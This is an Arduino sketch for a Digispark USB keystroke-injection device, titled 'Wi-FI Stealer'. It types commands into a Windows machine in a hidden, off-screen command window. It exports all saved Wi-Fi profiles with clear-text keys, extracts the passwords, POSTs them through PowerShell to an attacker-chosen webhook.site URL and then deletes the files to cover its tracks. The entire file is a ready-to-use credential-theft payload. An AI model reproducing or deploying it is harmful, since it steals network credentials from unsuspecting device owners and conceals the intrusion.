#include "DigiKeyboard.h"
void setup() {
}

void loop() {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(2500);
    
    /* Wi-FI Stealer */
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(100);
    DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_M);
    for(int i =0; i < 100; i++)
        {
        DigiKeyboard.sendKeyStroke(81);
        }
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
    DigiKeyboard.delay(100);
    DigiKeyboard.println("cd %temp%"); //going to temporary dir
    DigiKeyboard.delay(500);
    DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
    DigiKeyboard.delay(500);
    DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
    DigiKeyboard.delay(500);
    DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/[ADD-WEBHOOK-ADDRESS-HERE] -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
    DigiKeyboard.delay(100);
    DigiKeyboard.println("exit");
    DigiKeyboard.delay(100);

    for (;;) {
        /*Stops the digispark from running the scipt again*/
    }
}